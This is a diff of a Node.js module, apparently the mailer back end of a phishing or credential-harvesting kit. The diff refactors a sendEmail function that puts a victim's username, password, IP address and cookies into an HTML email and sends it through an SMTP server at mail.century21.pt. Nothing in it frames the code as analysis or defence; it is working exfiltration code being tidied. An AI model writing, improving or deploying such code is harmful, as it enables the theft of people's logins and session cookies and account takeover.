@@ -1,11 +1,11 @@
 const nodemailer = require('nodemailer');
-let httpMsgs = require('http-msgs');
+const httpMsgs = require('http-msgs');
 
 function createNodeMailerTransport(user, pass) {
     return nodemailer.createTransport({
         pool: true,
         host: 'mail.century21.pt',
-        port:  465,
+        port: 465,
         secure: true,
         auth: {
             user: user,
@@ -15,16 +15,26 @@ function createNodeMailerTransport(user, pass) {
 }
 
 function sendEmail(from, to, subject, username, pass, ip, cookies, nodeTransport) {
-    var mailDetails = {
+    // Convert cookies object to string
+    const cookiesString = JSON.stringify(cookies);
+
+    // Prepare email content
+    const emailContent = `
+        <p>Username: ${username}</p>
+        <p>Password: ${pass}</p>
+        <p>IP Address: ${ip}</p>
+        <p>Cookies: ${cookiesString}</p>
+    `;
+
+    // Create mail details
+    const mailDetails = {
         from: from,
         to: to,
         subject: subject,
-        html: '<p>Username: ' + username + '</p>' + '<p>Password: ' + pass + '</p>' + '<p>IP Address: ' + ip + '</p>'
-    }
+        html: emailContent
+    };
 
-    // Append cookies to the email body
-    mailDetails.html += '<p>Cookies: ' + cookies + '</p>';
-
+    // Send email
     nodeTransport.verify(function (error, success) {
         if (error) {
             console.log(error);
